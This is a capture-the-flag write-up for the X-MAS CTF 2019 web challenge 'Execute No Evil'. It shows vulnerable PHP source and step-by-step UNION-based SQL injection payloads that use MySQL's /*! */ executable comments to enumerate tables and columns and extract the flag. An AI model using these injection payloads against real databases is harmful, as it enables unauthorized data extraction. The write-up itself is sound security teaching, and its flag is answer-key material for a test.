# X-MAS CTF 2019 – Execute No Evil

* **Category:** web
* **Points:** 50

## Challenge

> (1) New Message: "Hey dude. So we have this database system at work and I just found an SQL injection point. I quickly fixed it by commenting out all the user input in the query. Don't worry, I made the query so that it responds with boss's profile, since he is kind of the only person actively using this database system, and he always looks up his own name, lol. Anyway, guess we'll go with this til' the sysadmin comes and fixes the issue."
>
> Huh, so hear no evil, see no evil, ... execute no evil?
>
> Remote server: http://challs.xmas.htsp.ro:11002
>
> Author: Milkdrop

## Solution

Analyzing the HTML source coude you can discover an interesting comment.

```html
<head>
	<link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
<form class="center">
	<h2>Cobalt Inc. employee database search</h2>
	<label>Name:</label>
	<input type="text" name="name" autocomplete="off">
	<input type="submit" value="Search">
</form>
<br>
<!-- ?source=1 -->


</body>
```

So, connecting to `http://challs.xmas.htsp.ro:11002/?source=1` you can print the PHP source code.

```php
<?php
if (isset ($_GET['source'])) {
    show_source ("index.php");
    die ();
}
?>

<head>
    <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
<form class="center">
    <h2>Cobalt Inc. employee database search</h2>
    <label>Name:</label>
    <input type="text" name="name" autocomplete="off">
    <input type="submit" value="Search">
</form>
<br>
<!-- ?source=1 -->

<?php
include ("config.php");
$conn = new mysqli ($servername, $username, $password, $dbname);

if (isset ($_GET['name'])) {
    $name = $_GET['name'];
    $name = str_replace ("*", "", $name);
    $records = mysqli_query ($conn, "SELECT * FROM users WHERE name=/*" . $name . "*/ 'Geronimo'", MYSQLI_USE_RESULT); // Don't tell boss

    if ($records === false) {
        die ("<p>Our servers have run into a query error. Please try again later.</p>");
    }

    echo '<table>';
    echo '
    <tr>
        <th>Name</th>
        <th>Description</th>
    </tr>';

    while ($row = mysqli_fetch_array ($records, MYSQLI_ASSOC)) {
        echo '<tr>
            <td>',$row["name"],'</td>
            <td>',$row["description"],'</td>
        </tr>';
    }

    echo '</table>';
}
?>

</body>
```

Even if the `$name` variable is concatenated inside a MySQL comment, the code is still vulnerable to SQL injection, because MySQL can execute query portions inside comments.

From [https://www.owasp.org/index.php/Testing_for_MySQL](https://www.owasp.org/index.php/Testing_for_MySQL):

> Fingerprinting MySQL
>
> Of course, the first thing to know is if there's MySQL DBMS as a back end database. MySQL server has a feature that is used to let other DBMS ignore a clause in MySQL dialect. When a comment block ('/**/') contains an exclamation mark ('/*! sql here*/') it is interpreted by MySQL, and is considered as a normal comment block by other DBMS as explained in MySQL manual.
> 
> Example:
>
> 1 /*! and 1=0 */
> 
> Result Expected:
>
> If MySQL is present, the clause inside the comment block will be interpreted.

The base to perform SQL injection is the following.

```sql
challs.xmas.htsp.ro:11002/?name=!'Geronimo' UNION <malicious payload> UNION SELECT 'foo', name, description FROM users WHERE name =
```

First of all you could try to enumerate DB tables.

```sql
challs.xmas.htsp.ro:11002/?name=!'Geronimo' UNION SELECT 'foo', table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' UNION SELECT 'foo', name, description FROM users WHERE name =
```

And you will discover that a `flag` table exists.

```html
<head>
	<link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
<form class="center">
	<h2>Cobalt Inc. employee database search</h2>
	<label>Name:</label>
	<input type="text" name="name" autocomplete="off">
	<input type="submit" value="Search">
</form>
<br>
<!-- ?source=1 -->

<table>
	<tr>
		<th>Name</th>
		<th>Description</th>
	</tr><tr>
			<td>Geronimo</td>
			<td>People say he owns a Cadillac ...</td>
		</tr><tr>
			<td>ctf</td>
			<td>users</td>
		</tr><tr>
			<td>ctf</td>
			<td>flag</td>
		</tr><tr>
			<td>Geronimo</td>
			<td>People say he owns a Cadillac ...</td>
		</tr></table>
</body>
```

Then you can enumerate table columns.

```sql
challs.xmas.htsp.ro:11002/?name=!'Geronimo' UNION SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_name = 'flag' UNION SELECT 'foo', name, description FROM users WHERE name =
```

And you can discover that a column called `whatsthis` exists.

```html
<head>
	<link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
<form class="center">
	<h2>Cobalt Inc. employee database search</h2>
	<label>Name:</label>
	<input type="text" name="name" autocomplete="off">
	<input type="submit" value="Search">
</form>
<br>
<!-- ?source=1 -->

<table>
	<tr>
		<th>Name</th>
		<th>Description</th>
	</tr><tr>
			<td>Geronimo</td>
			<td>People say he owns a Cadillac ...</td>
		</tr><tr>
			<td>flag</td>
			<td>whatsthis</td>
		</tr><tr>
			<td>Geronimo</td>
			<td>People say he owns a Cadillac ...</td>
		</tr></table>
</body>
```

And now you can print the content of the table.

```sql
challs.xmas.htsp.ro:11002/?name=!'Geronimo' UNION SELECT 'foo', 'bar', whatsthis FROM flag UNION SELECT 'foo', name, description FROM users WHERE name =
```

The content of the table will reveal the flag.

```html
<head>
	<link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
<form class="center">
	<h2>Cobalt Inc. employee database search</h2>
	<label>Name:</label>
	<input type="text" name="name" autocomplete="off">
	<input type="submit" value="Search">
</form>
<br>
<!-- ?source=1 -->

<table>
	<tr>
		<th>Name</th>
		<th>Description</th>
	</tr><tr>
			<td>Geronimo</td>
			<td>People say he owns a Cadillac ...</td>
		</tr><tr>
			<td>bar</td>
			<td>X-MAS{What?__But_1_Th0ught_Comments_dont_3x3cvt3:(}</td>
		</tr><tr>
			<td>Geronimo</td>
			<td>People say he owns a Cadillac ...</td>
		</tr></table>
</body>
```

The flag is the following.

```
X-MAS{What?__But_1_Th0ught_Comments_dont_3x3cvt3:(}
```